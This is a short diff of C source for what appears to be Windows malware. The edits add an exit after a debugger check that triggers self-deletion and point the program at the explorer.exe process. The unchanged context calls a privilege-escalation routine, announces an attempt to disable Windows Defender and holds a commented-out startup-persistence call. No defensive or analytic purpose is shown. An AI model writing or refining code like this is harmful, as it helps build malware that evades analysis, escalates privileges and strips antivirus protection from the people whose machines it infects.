@@ -30,7 +30,7 @@ int main(int arcg,char* argv[]) {
 		if (IsDebuggerPresent()){
 			
 			SelfDelete();
-			
+			return 1;
 		
 		}
 
@@ -40,17 +40,17 @@ int main(int arcg,char* argv[]) {
 
 		QueryPerformanceFrequency(&Frequency);
 		QueryPerformanceCounter(&StartingTime);
-
+		
 		/*
 		AddToStartup();
 
 		if (arcg < 2) { printf("%s usage : rogram.exe <PID>", e);
 		return EXIT_FAILURE;
 		}
-
+		
 		PID = atoi(argv[1]);
 		*/
-		PID = get_pid();
+		PID = get_pid(L"explorer.exe");
 
 		priv_esc();
 		printf("%s trying to disable windows defender...\n", k);
@@ -132,7 +132,7 @@ int main(int arcg,char* argv[]) {
 
 		PID = atoi(argv[1]);
 		*/
-		PID = get_pid();
+		PID = get_pid(L"explorer.exe");
 
 		priv_esc();
 
